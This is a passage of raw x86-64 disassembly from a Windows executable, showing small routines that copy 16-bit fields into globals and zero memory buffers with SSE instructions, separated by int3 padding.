   1400087ad:	66 89 05 8e 7d 2b 00 	mov    %ax,0x2b7d8e(%rip)        # 0x1402c0542
   1400087b4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400087b8:	66 89 05 85 7d 2b 00 	mov    %ax,0x2b7d85(%rip)        # 0x1402c0544
   1400087bf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400087c3:	66 89 05 7c 7d 2b 00 	mov    %ax,0x2b7d7c(%rip)        # 0x1402c0546
   1400087ca:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400087ce:	66 89 05 73 7d 2b 00 	mov    %ax,0x2b7d73(%rip)        # 0x1402c0548
   1400087d5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400087d9:	66 89 05 6a 7d 2b 00 	mov    %ax,0x2b7d6a(%rip)        # 0x1402c054a
   1400087e0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400087e4:	66 89 05 61 7d 2b 00 	mov    %ax,0x2b7d61(%rip)        # 0x1402c054c
   1400087eb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400087ef:	66 89 05 58 7d 2b 00 	mov    %ax,0x2b7d58(%rip)        # 0x1402c054e
   1400087f6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400087fa:	66 89 05 4f 7d 2b 00 	mov    %ax,0x2b7d4f(%rip)        # 0x1402c0550
   140008801:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008805:	66 89 05 46 7d 2b 00 	mov    %ax,0x2b7d46(%rip)        # 0x1402c0552
   14000880c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008810:	66 89 05 3d 7d 2b 00 	mov    %ax,0x2b7d3d(%rip)        # 0x1402c0554
   140008817:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000881b:	66 89 05 34 7d 2b 00 	mov    %ax,0x2b7d34(%rip)        # 0x1402c0556
   140008822:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008826:	66 89 05 2b 7d 2b 00 	mov    %ax,0x2b7d2b(%rip)        # 0x1402c0558
   14000882d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008831:	66 89 05 22 7d 2b 00 	mov    %ax,0x2b7d22(%rip)        # 0x1402c055a
   140008838:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000883c:	66 89 05 19 7d 2b 00 	mov    %ax,0x2b7d19(%rip)        # 0x1402c055c
   140008843:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008847:	66 89 05 10 7d 2b 00 	mov    %ax,0x2b7d10(%rip)        # 0x1402c055e
   14000884e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008852:	66 89 05 07 7d 2b 00 	mov    %ax,0x2b7d07(%rip)        # 0x1402c0560
   140008859:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000885d:	66 89 05 fe 7c 2b 00 	mov    %ax,0x2b7cfe(%rip)        # 0x1402c0562
   140008864:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008868:	66 89 05 f5 7c 2b 00 	mov    %ax,0x2b7cf5(%rip)        # 0x1402c0564
   14000886f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008873:	66 89 05 ec 7c 2b 00 	mov    %ax,0x2b7cec(%rip)        # 0x1402c0566
   14000887a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000887e:	66 89 05 e3 7c 2b 00 	mov    %ax,0x2b7ce3(%rip)        # 0x1402c0568
   140008885:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008889:	66 89 05 da 7c 2b 00 	mov    %ax,0x2b7cda(%rip)        # 0x1402c056a
   140008890:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140008894:	66 89 05 d1 7c 2b 00 	mov    %ax,0x2b7cd1(%rip)        # 0x1402c056c
   14000889b:	c3                   	ret
   14000889c:	cc                   	int3
   14000889d:	cc                   	int3
   14000889e:	cc                   	int3
   14000889f:	cc                   	int3
   1400088a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400088a3:	0f 11 05 b4 7c 2b 00 	movups %xmm0,0x2b7cb4(%rip)        # 0x1402c055e
   1400088aa:	0f 11 05 9f 7c 2b 00 	movups %xmm0,0x2b7c9f(%rip)        # 0x1402c0550
   1400088b1:	0f 11 05 88 7c 2b 00 	movups %xmm0,0x2b7c88(%rip)        # 0x1402c0540
   1400088b8:	0f 11 05 71 7c 2b 00 	movups %xmm0,0x2b7c71(%rip)        # 0x1402c0530
   1400088bf:	c3                   	ret
   1400088c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400088c3:	0f 29 05 a6 7c 2b 00 	movaps %xmm0,0x2b7ca6(%rip)        # 0x1402c0570
   1400088ca:	66 c7 05 ad 7c 2b 00 	movw   $0x0,0x2b7cad(%rip)        # 0x1402c0580
   1400088d1:	00 00 
   1400088d3:	c3                   	ret
   1400088d4:	cc                   	int3
   1400088d5:	cc                   	int3
   1400088d6:	cc                   	int3
   1400088d7:	cc                   	int3
   1400088d8:	cc                   	int3
   1400088d9:	cc                   	int3
   1400088da:	cc                   	int3
   1400088db:	cc                   	int3
   1400088dc:	cc                   	int3
   1400088dd:	cc                   	int3
   1400088de:	cc                   	int3
   1400088df:	cc                   	int3
   1400088e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400088e3:	0f 29 05 a6 7c 2b 00 	movaps %xmm0,0x2b7ca6(%rip)        # 0x1402c0590
   1400088ea:	48 c7 05 ab 7c 2b 00 	movq   $0x0,0x2b7cab(%rip)        # 0x1402c05a0
   1400088f1:	00 00 00 00 
   1400088f5:	c3                   	ret
   1400088f6:	cc                   	int3
   1400088f7:	cc                   	int3
   1400088f8:	cc                   	int3
   1400088f9:	cc                   	int3
   1400088fa:	cc                   	int3
   1400088fb:	cc                   	int3
   1400088fc:	cc                   	int3
   1400088fd:	cc                   	int3
   1400088fe:	cc                   	int3
   1400088ff:	cc                   	int3
   140008900:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008903:	0f 29 05 a6 7c 2b 00 	movaps %xmm0,0x2b7ca6(%rip)        # 0x1402c05b0
   14000890a:	c3                   	ret
   14000890b:	cc                   	int3
   14000890c:	cc                   	int3
   14000890d:	cc                   	int3
   14000890e:	cc                   	int3
   14000890f:	cc                   	int3
   140008910:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008913:	0f 29 05 76 7d 2b 00 	movaps %xmm0,0x2b7d76(%rip)        # 0x1402c0690
   14000891a:	0f 29 05 5f 7d 2b 00 	movaps %xmm0,0x2b7d5f(%rip)        # 0x1402c0680
   140008921:	0f 29 05 48 7d 2b 00 	movaps %xmm0,0x2b7d48(%rip)        # 0x1402c0670
   140008928:	0f 29 05 31 7d 2b 00 	movaps %xmm0,0x2b7d31(%rip)        # 0x1402c0660
   14000892f:	0f 29 05 1a 7d 2b 00 	movaps %xmm0,0x2b7d1a(%rip)        # 0x1402c0650
   140008936:	0f 29 05 03 7d 2b 00 	movaps %xmm0,0x2b7d03(%rip)        # 0x1402c0640
   14000893d:	0f 29 05 ec 7c 2b 00 	movaps %xmm0,0x2b7cec(%rip)        # 0x1402c0630
   140008944:	0f 29 05 d5 7c 2b 00 	movaps %xmm0,0x2b7cd5(%rip)        # 0x1402c0620
   14000894b:	0f 29 05 be 7c 2b 00 	movaps %xmm0,0x2b7cbe(%rip)        # 0x1402c0610
   140008952:	0f 29 05 a7 7c 2b 00 	movaps %xmm0,0x2b7ca7(%rip)        # 0x1402c0600
   140008959:	0f 29 05 90 7c 2b 00 	movaps %xmm0,0x2b7c90(%rip)        # 0x1402c05f0
   140008960:	0f 29 05 79 7c 2b 00 	movaps %xmm0,0x2b7c79(%rip)        # 0x1402c05e0
   140008967:	0f 29 05 62 7c 2b 00 	movaps %xmm0,0x2b7c62(%rip)        # 0x1402c05d0
   14000896e:	48 c7 05 25 7d 2b 00 	movq   $0x0,0x2b7d25(%rip)        # 0x1402c069e
   140008975:	00 00 00 00 
   140008979:	c3                   	ret
   14000897a:	cc                   	int3
   14000897b:	cc                   	int3
   14000897c:	cc                   	int3
   14000897d:	cc                   	int3
   14000897e:	cc                   	int3
   14000897f:	cc                   	int3
   140008980:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008983:	0f 29 05 76 7d 2b 00 	movaps %xmm0,0x2b7d76(%rip)        # 0x1402c0700
   14000898a:	0f 29 05 5f 7d 2b 00 	movaps %xmm0,0x2b7d5f(%rip)        # 0x1402c06f0
   140008991:	0f 29 05 48 7d 2b 00 	movaps %xmm0,0x2b7d48(%rip)        # 0x1402c06e0
   140008998:	0f 29 05 31 7d 2b 00 	movaps %xmm0,0x2b7d31(%rip)        # 0x1402c06d0
   14000899f:	0f 29 05 1a 7d 2b 00 	movaps %xmm0,0x2b7d1a(%rip)        # 0x1402c06c0
   1400089a6:	0f 29 05 03 7d 2b 00 	movaps %xmm0,0x2b7d03(%rip)        # 0x1402c06b0
   1400089ad:	48 c7 05 56 7d 2b 00 	movq   $0x0,0x2b7d56(%rip)        # 0x1402c070e
   1400089b4:	00 00 00 00 
   1400089b8:	c3                   	ret
   1400089b9:	cc                   	int3
   1400089ba:	cc                   	int3
   1400089bb:	cc                   	int3
   1400089bc:	cc                   	int3
   1400089bd:	cc                   	int3
   1400089be:	cc                   	int3
   1400089bf:	cc                   	int3
   1400089c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400089c3:	0f 29 05 56 7d 2b 00 	movaps %xmm0,0x2b7d56(%rip)        # 0x1402c0720
   1400089ca:	66 c7 05 5d 7d 2b 00 	movw   $0x0,0x2b7d5d(%rip)        # 0x1402c0730
   1400089d1:	00 00 
   1400089d3:	c3                   	ret
   1400089d4:	cc                   	int3
   1400089d5:	cc                   	int3
   1400089d6:	cc                   	int3
   1400089d7:	cc                   	int3
   1400089d8:	cc                   	int3
   1400089d9:	cc                   	int3
   1400089da:	cc                   	int3
   1400089db:	cc                   	int3
   1400089dc:	cc                   	int3
   1400089dd:	cc                   	int3
   1400089de:	cc                   	int3
   1400089df:	cc                   	int3
   1400089e0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400089e3:	0f 29 05 a6 7d 2b 00 	movaps %xmm0,0x2b7da6(%rip)        # 0x1402c0790
   1400089ea:	0f 29 05 8f 7d 2b 00 	movaps %xmm0,0x2b7d8f(%rip)        # 0x1402c0780
   1400089f1:	0f 29 05 78 7d 2b 00 	movaps %xmm0,0x2b7d78(%rip)        # 0x1402c0770
   1400089f8:	0f 29 05 61 7d 2b 00 	movaps %xmm0,0x2b7d61(%rip)        # 0x1402c0760
   1400089ff:	0f 29 05 4a 7d 2b 00 	movaps %xmm0,0x2b7d4a(%rip)        # 0x1402c0750
   140008a06:	0f 29 05 33 7d 2b 00 	movaps %xmm0,0x2b7d33(%rip)        # 0x1402c0740
   140008a0d:	c7 05 89 7d 2b 00 00 	movl   $0x0,0x2b7d89(%rip)        # 0x1402c07a0
   140008a14:	00 00 00 
   140008a17:	c3                   	ret
   140008a18:	cc                   	int3
   140008a19:	cc                   	int3
   140008a1a:	cc                   	int3
   140008a1b:	cc                   	int3
   140008a1c:	cc                   	int3
   140008a1d:	cc                   	int3
   140008a1e:	cc                   	int3
   140008a1f:	cc                   	int3
   140008a20:	c6 05 b3 7d 2b 00 01 	movb   $0x1,0x2b7db3(%rip)        # 0x1402c07da
   140008a27:	0f b7 01             	movzwl (%rcx),%eax
   140008a2a:	66 89 05 7f 7d 2b 00 	mov    %ax,0x2b7d7f(%rip)        # 0x1402c07b0
   140008a31:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008a35:	66 89 05 76 7d 2b 00 	mov    %ax,0x2b7d76(%rip)        # 0x1402c07b2
   140008a3c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008a40:	66 89 05 6d 7d 2b 00 	mov    %ax,0x2b7d6d(%rip)        # 0x1402c07b4
   140008a47:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008a4b:	66 89 05 64 7d 2b 00 	mov    %ax,0x2b7d64(%rip)        # 0x1402c07b6
   140008a52:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008a56:	66 89 05 5b 7d 2b 00 	mov    %ax,0x2b7d5b(%rip)        # 0x1402c07b8
   140008a5d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008a61:	66 89 05 52 7d 2b 00 	mov    %ax,0x2b7d52(%rip)        # 0x1402c07ba
   140008a68:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008a6c:	66 89 05 49 7d 2b 00 	mov    %ax,0x2b7d49(%rip)        # 0x1402c07bc
   140008a73:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008a77:	66 89 05 40 7d 2b 00 	mov    %ax,0x2b7d40(%rip)        # 0x1402c07be
   140008a7e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008a82:	66 89 05 37 7d 2b 00 	mov    %ax,0x2b7d37(%rip)        # 0x1402c07c0
   140008a89:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008a8d:	66 89 05 2e 7d 2b 00 	mov    %ax,0x2b7d2e(%rip)        # 0x1402c07c2
   140008a94:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008a98:	66 89 05 25 7d 2b 00 	mov    %ax,0x2b7d25(%rip)        # 0x1402c07c4
   140008a9f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008aa3:	66 89 05 1c 7d 2b 00 	mov    %ax,0x2b7d1c(%rip)        # 0x1402c07c6
   140008aaa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008aae:	66 89 05 13 7d 2b 00 	mov    %ax,0x2b7d13(%rip)        # 0x1402c07c8
   140008ab5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008ab9:	66 89 05 0a 7d 2b 00 	mov    %ax,0x2b7d0a(%rip)        # 0x1402c07ca
   140008ac0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008ac4:	66 89 05 01 7d 2b 00 	mov    %ax,0x2b7d01(%rip)        # 0x1402c07cc
   140008acb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008acf:	66 89 05 f8 7c 2b 00 	mov    %ax,0x2b7cf8(%rip)        # 0x1402c07ce
   140008ad6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008ada:	66 89 05 ef 7c 2b 00 	mov    %ax,0x2b7cef(%rip)        # 0x1402c07d0
   140008ae1:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008ae5:	66 89 05 e6 7c 2b 00 	mov    %ax,0x2b7ce6(%rip)        # 0x1402c07d2
   140008aec:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008af0:	66 89 05 dd 7c 2b 00 	mov    %ax,0x2b7cdd(%rip)        # 0x1402c07d4
   140008af7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008afb:	66 89 05 d4 7c 2b 00 	mov    %ax,0x2b7cd4(%rip)        # 0x1402c07d6
   140008b02:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008b06:	66 89 05 cb 7c 2b 00 	mov    %ax,0x2b7ccb(%rip)        # 0x1402c07d8
   140008b0d:	c3                   	ret
   140008b0e:	cc                   	int3
   140008b0f:	cc                   	int3
   140008b10:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b13:	0f 11 05 b0 7c 2b 00 	movups %xmm0,0x2b7cb0(%rip)        # 0x1402c07ca
   140008b1a:	0f 29 05 9f 7c 2b 00 	movaps %xmm0,0x2b7c9f(%rip)        # 0x1402c07c0
   140008b21:	0f 29 05 88 7c 2b 00 	movaps %xmm0,0x2b7c88(%rip)        # 0x1402c07b0
   140008b28:	c3                   	ret
   140008b29:	cc                   	int3
   140008b2a:	cc                   	int3
   140008b2b:	cc                   	int3
   140008b2c:	cc                   	int3
   140008b2d:	cc                   	int3
   140008b2e:	cc                   	int3
   140008b2f:	cc                   	int3
   140008b30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b33:	0f 11 05 b4 7c 2b 00 	movups %xmm0,0x2b7cb4(%rip)        # 0x1402c07ee
   140008b3a:	0f 29 05 9f 7c 2b 00 	movaps %xmm0,0x2b7c9f(%rip)        # 0x1402c07e0
   140008b41:	c3                   	ret
   140008b42:	cc                   	int3
   140008b43:	cc                   	int3
   140008b44:	cc                   	int3
   140008b45:	cc                   	int3
   140008b46:	cc                   	int3
   140008b47:	cc                   	int3
   140008b48:	cc                   	int3
   140008b49:	cc                   	int3
   140008b4a:	cc                   	int3
   140008b4b:	cc                   	int3
   140008b4c:	cc                   	int3
   140008b4d:	cc                   	int3
   140008b4e:	cc                   	int3
   140008b4f:	cc                   	int3
   140008b50:	c6 05 d3 7c 2b 00 01 	movb   $0x1,0x2b7cd3(%rip)        # 0x1402c082a
   140008b57:	0f b7 01             	movzwl (%rcx),%eax
   140008b5a:	66 89 05 9f 7c 2b 00 	mov    %ax,0x2b7c9f(%rip)        # 0x1402c0800
   140008b61:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008b65:	66 89 05 96 7c 2b 00 	mov    %ax,0x2b7c96(%rip)        # 0x1402c0802
   140008b6c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008b70:	66 89 05 8d 7c 2b 00 	mov    %ax,0x2b7c8d(%rip)        # 0x1402c0804
   140008b77:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008b7b:	66 89 05 84 7c 2b 00 	mov    %ax,0x2b7c84(%rip)        # 0x1402c0806
   140008b82:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008b86:	66 89 05 7b 7c 2b 00 	mov    %ax,0x2b7c7b(%rip)        # 0x1402c0808
   140008b8d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008b91:	66 89 05 72 7c 2b 00 	mov    %ax,0x2b7c72(%rip)        # 0x1402c080a
   140008b98:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008b9c:	66 89 05 69 7c 2b 00 	mov    %ax,0x2b7c69(%rip)        # 0x1402c080c
   140008ba3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008ba7:	66 89 05 60 7c 2b 00 	mov    %ax,0x2b7c60(%rip)        # 0x1402c080e
   140008bae:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008bb2:	66 89 05 57 7c 2b 00 	mov    %ax,0x2b7c57(%rip)        # 0x1402c0810
   140008bb9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008bbd:	66 89 05 4e 7c 2b 00 	mov    %ax,0x2b7c4e(%rip)        # 0x1402c0812
   140008bc4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008bc8:	66 89 05 45 7c 2b 00 	mov    %ax,0x2b7c45(%rip)        # 0x1402c0814
   140008bcf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008bd3:	66 89 05 3c 7c 2b 00 	mov    %ax,0x2b7c3c(%rip)        # 0x1402c0816
   140008bda:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008bde:	66 89 05 33 7c 2b 00 	mov    %ax,0x2b7c33(%rip)        # 0x1402c0818
   140008be5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008be9:	66 89 05 2a 7c 2b 00 	mov    %ax,0x2b7c2a(%rip)        # 0x1402c081a
   140008bf0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008bf4:	66 89 05 21 7c 2b 00 	mov    %ax,0x2b7c21(%rip)        # 0x1402c081c
   140008bfb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008bff:	66 89 05 18 7c 2b 00 	mov    %ax,0x2b7c18(%rip)        # 0x1402c081e
   140008c06:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008c0a:	66 89 05 0f 7c 2b 00 	mov    %ax,0x2b7c0f(%rip)        # 0x1402c0820
   140008c11:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008c15:	66 89 05 06 7c 2b 00 	mov    %ax,0x2b7c06(%rip)        # 0x1402c0822
   140008c1c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008c20:	66 89 05 fd 7b 2b 00 	mov    %ax,0x2b7bfd(%rip)        # 0x1402c0824
   140008c27:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008c2b:	66 89 05 f4 7b 2b 00 	mov    %ax,0x2b7bf4(%rip)        # 0x1402c0826
   140008c32:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008c36:	66 89 05 eb 7b 2b 00 	mov    %ax,0x2b7beb(%rip)        # 0x1402c0828
   140008c3d:	c3                   	ret
   140008c3e:	cc                   	int3
   140008c3f:	cc                   	int3
   140008c40:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008c43:	0f 11 05 d0 7b 2b 00 	movups %xmm0,0x2b7bd0(%rip)        # 0x1402c081a
   140008c4a:	0f 29 05 bf 7b 2b 00 	movaps %xmm0,0x2b7bbf(%rip)        # 0x1402c0810
   140008c51:	0f 29 05 a8 7b 2b 00 	movaps %xmm0,0x2b7ba8(%rip)        # 0x1402c0800
   140008c58:	c3                   	ret
   140008c59:	cc                   	int3
   140008c5a:	cc                   	int3
   140008c5b:	cc                   	int3
   140008c5c:	cc                   	int3
   140008c5d:	cc                   	int3
   140008c5e:	cc                   	int3
   140008c5f:	cc                   	int3
   140008c60:	c6 05 eb 7b 2b 00 01 	movb   $0x1,0x2b7beb(%rip)        # 0x1402c0852
   140008c67:	0f b7 01             	movzwl (%rcx),%eax
   140008c6a:	66 89 05 bf 7b 2b 00 	mov    %ax,0x2b7bbf(%rip)        # 0x1402c0830
   140008c71:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008c75:	66 89 05 b6 7b 2b 00 	mov    %ax,0x2b7bb6(%rip)        # 0x1402c0832
   140008c7c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008c80:	66 89 05 ad 7b 2b 00 	mov    %ax,0x2b7bad(%rip)        # 0x1402c0834
   140008c87:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008c8b:	66 89 05 a4 7b 2b 00 	mov    %ax,0x2b7ba4(%rip)        # 0x1402c0836
   140008c92:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008c96:	66 89 05 9b 7b 2b 00 	mov    %ax,0x2b7b9b(%rip)        # 0x1402c0838
   140008c9d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008ca1:	66 89 05 92 7b 2b 00 	mov    %ax,0x2b7b92(%rip)        # 0x1402c083a
   140008ca8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008cac:	66 89 05 89 7b 2b 00 	mov    %ax,0x2b7b89(%rip)        # 0x1402c083c
   140008cb3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008cb7:	66 89 05 80 7b 2b 00 	mov    %ax,0x2b7b80(%rip)        # 0x1402c083e
   140008cbe:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008cc2:	66 89 05 77 7b 2b 00 	mov    %ax,0x2b7b77(%rip)        # 0x1402c0840
   140008cc9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008ccd:	66 89 05 6e 7b 2b 00 	mov    %ax,0x2b7b6e(%rip)        # 0x1402c0842
   140008cd4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008cd8:	66 89 05 65 7b 2b 00 	mov    %ax,0x2b7b65(%rip)        # 0x1402c0844
   140008cdf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008ce3:	66 89 05 5c 7b 2b 00 	mov    %ax,0x2b7b5c(%rip)        # 0x1402c0846
   140008cea:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008cee:	66 89 05 53 7b 2b 00 	mov    %ax,0x2b7b53(%rip)        # 0x1402c0848
   140008cf5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008cf9:	66 89 05 4a 7b 2b 00 	mov    %ax,0x2b7b4a(%rip)        # 0x1402c084a
   140008d00:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008d04:	66 89 05 41 7b 2b 00 	mov    %ax,0x2b7b41(%rip)        # 0x1402c084c
   140008d0b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008d0f:	66 89 05 38 7b 2b 00 	mov    %ax,0x2b7b38(%rip)        # 0x1402c084e
   140008d16:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008d1a:	66 89 05 2f 7b 2b 00 	mov    %ax,0x2b7b2f(%rip)        # 0x1402c0850
   140008d21:	c3                   	ret
   140008d22:	cc                   	int3
   140008d23:	cc                   	int3
   140008d24:	cc                   	int3
   140008d25:	cc                   	int3
   140008d26:	cc                   	int3
   140008d27:	cc                   	int3
   140008d28:	cc                   	int3
   140008d29:	cc                   	int3
   140008d2a:	cc                   	int3
   140008d2b:	cc                   	int3
   140008d2c:	cc                   	int3
   140008d2d:	cc                   	int3
   140008d2e:	cc                   	int3
   140008d2f:	cc                   	int3
   140008d30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008d33:	0f 29 05 06 7b 2b 00 	movaps %xmm0,0x2b7b06(%rip)        # 0x1402c0840
   140008d3a:	0f 29 05 ef 7a 2b 00 	movaps %xmm0,0x2b7aef(%rip)        # 0x1402c0830
   140008d41:	66 c7 05 06 7b 2b 00 	movw   $0x0,0x2b7b06(%rip)        # 0x1402c0850
   140008d48:	00 00 
   140008d4a:	c3                   	ret
   140008d4b:	cc                   	int3
   140008d4c:	cc                   	int3
   140008d4d:	cc                   	int3
   140008d4e:	cc                   	int3
   140008d4f:	cc                   	int3
   140008d50:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008d53:	0f 11 05 10 7b 2b 00 	movups %xmm0,0x2b7b10(%rip)        # 0x1402c086a
   140008d5a:	0f 29 05 ff 7a 2b 00 	movaps %xmm0,0x2b7aff(%rip)        # 0x1402c0860
   140008d61:	c3                   	ret
   140008d62:	cc                   	int3
   140008d63:	cc                   	int3
   140008d64:	cc                   	int3
   140008d65:	cc                   	int3
   140008d66:	cc                   	int3
   140008d67:	cc                   	int3
   140008d68:	cc                   	int3
   140008d69:	cc                   	int3
   140008d6a:	cc                   	int3
   140008d6b:	cc                   	int3
   140008d6c:	cc                   	int3
   140008d6d:	cc                   	int3
   140008d6e:	cc                   	int3
   140008d6f:	cc                   	int3
   140008d70:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008d73:	0f 11 05 12 7b 2b 00 	movups %xmm0,0x2b7b12(%rip)        # 0x1402c088c
   140008d7a:	0f 29 05 ff 7a 2b 00 	movaps %xmm0,0x2b7aff(%rip)        # 0x1402c0880
   140008d81:	c3                   	ret
   140008d82:	cc                   	int3
   140008d83:	cc                   	int3
   140008d84:	cc                   	int3
   140008d85:	cc                   	int3
   140008d86:	cc                   	int3
   140008d87:	cc                   	int3
   140008d88:	cc                   	int3
   140008d89:	cc                   	int3
   140008d8a:	cc                   	int3
   140008d8b:	cc                   	int3
   140008d8c:	cc                   	int3
   140008d8d:	cc                   	int3
   140008d8e:	cc                   	int3
   140008d8f:	cc                   	int3
   140008d90:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008d93:	0f 29 05 66 7b 2b 00 	movaps %xmm0,0x2b7b66(%rip)        # 0x1402c0900
   140008d9a:	0f 29 05 4f 7b 2b 00 	movaps %xmm0,0x2b7b4f(%rip)        # 0x1402c08f0
   140008da1:	0f 29 05 38 7b 2b 00 	movaps %xmm0,0x2b7b38(%rip)        # 0x1402c08e0
   140008da8:	0f 29 05 21 7b 2b 00 	movaps %xmm0,0x2b7b21(%rip)        # 0x1402c08d0
   140008daf:	0f 29 05 0a 7b 2b 00 	movaps %xmm0,0x2b7b0a(%rip)        # 0x1402c08c0
   140008db6:	0f 29 05 f3 7a 2b 00 	movaps %xmm0,0x2b7af3(%rip)        # 0x1402c08b0
   140008dbd:	0f 29 05 dc 7a 2b 00 	movaps %xmm0,0x2b7adc(%rip)        # 0x1402c08a0
   140008dc4:	48 c7 05 3f 7b 2b 00 	movq   $0x0,0x2b7b3f(%rip)        # 0x1402c090e
   140008dcb:	00 00 00 00 
   140008dcf:	c3                   	ret
   140008dd0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008dd3:	0f 29 05 46 7b 2b 00 	movaps %xmm0,0x2b7b46(%rip)        # 0x1402c0920
   140008dda:	48 c7 05 49 7b 2b 00 	movq   $0x0,0x2b7b49(%rip)        # 0x1402c092e
   140008de1:	00 00 00 00 
   140008de5:	c3                   	ret
   140008de6:	cc                   	int3
   140008de7:	cc                   	int3
   140008de8:	cc                   	int3
   140008de9:	cc                   	int3
   140008dea:	cc                   	int3
   140008deb:	cc                   	int3
   140008dec:	cc                   	int3
   140008ded:	cc                   	int3
   140008dee:	cc                   	int3
   140008def:	cc                   	int3
   140008df0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008df3:	0f 29 05 b6 7b 2b 00 	movaps %xmm0,0x2b7bb6(%rip)        # 0x1402c09b0
   140008dfa:	0f 29 05 9f 7b 2b 00 	movaps %xmm0,0x2b7b9f(%rip)        # 0x1402c09a0
   140008e01:	0f 29 05 88 7b 2b 00 	movaps %xmm0,0x2b7b88(%rip)        # 0x1402c0990
   140008e08:	0f 29 05 71 7b 2b 00 	movaps %xmm0,0x2b7b71(%rip)        # 0x1402c0980
   140008e0f:	0f 29 05 5a 7b 2b 00 	movaps %xmm0,0x2b7b5a(%rip)        # 0x1402c0970
   140008e16:	0f 29 05 43 7b 2b 00 	movaps %xmm0,0x2b7b43(%rip)        # 0x1402c0960
